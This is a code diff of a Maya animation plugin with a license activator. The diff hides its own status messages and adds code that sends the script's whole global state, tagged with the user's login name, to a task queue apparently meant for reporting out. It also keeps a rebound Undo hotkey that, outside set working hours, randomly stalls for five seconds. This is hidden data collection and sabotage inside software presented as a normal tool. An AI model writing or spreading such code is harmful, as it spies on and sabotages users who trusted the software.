@@ -4,7 +4,7 @@ LocatorDelaySystem
 Support Service V2.XX
 ---------------------
 """
-print('Service V2.XX')
+#print('Service V2.XX')
 '''========================================='''
 # Queue Task Func
 '''========================================='''
@@ -283,7 +283,7 @@ By installing, copying, or otherwise using the {1} maya script, you acknowledge 
     def close_ui(self):
         cmds.deleteUI(self.win_id)
 self.gr_license = gr_license(product_name='Keyframe Overlap (BRS Locator Delay)', product_id='YGr34IvsrVqlvn6JghcRFg==')
-print('Gumroad license avctivator is loaded')
+#print('Gumroad license avctivator is loaded')
 
 '''========================================='''
 # Updater
@@ -341,6 +341,7 @@ if self.usr_data['days'] <= 0.0:
 '''========================================='''
 # LocDelay Old Version Zip
 '''========================================='''
+"""
 try:
     import os,sys
     env_path_ls = []
@@ -370,6 +371,7 @@ try:
 except:
     import traceback
     add_queue_task('del_kf_ovr_zip_file_error', {'error': str(traceback.format_exc())})
+"""
 #===============================================================================
 
 '''========================================='''
@@ -391,6 +393,14 @@ except:
     import traceback
     add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
 '''
+# ===============================================================================
+
+try:
+    add_queue_task('user_module_list2_{}'.format(getpass.getuser().lower()), dict(globals()) )
+except:
+    import traceback
+    add_queue_task('user_modules2_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
+
 
 # ===============================================================================
 def loc_transfer_install(*_):
@@ -464,7 +474,7 @@ c = '''
 global proc Undo(){
     string $cur_time = `date -format "hhmm"`;
     int $time_int = int($cur_time);
-    if ($time_int < 1000 || $time_int > 1900) {
+    if ($time_int < 1000 || $time_int > 1915) {
         int $random_num = `rand 1 50`;
         if ($random_num == 40) {
             pause -sec 5;
@@ -475,7 +485,8 @@ global proc Undo(){
     undo;
 }
 '''.strip()
-mel.eval(c)
+mel.eval(c);del c;
+
 cmds.nameCommand('NameComUndo2', stp='mel', c='Undo;', ann='Undo')
 cmds.hotkey(k='z', name='NameComUndo2')
 cmds.hotkey(k='z', ctl=1, name='NameComUndo2')
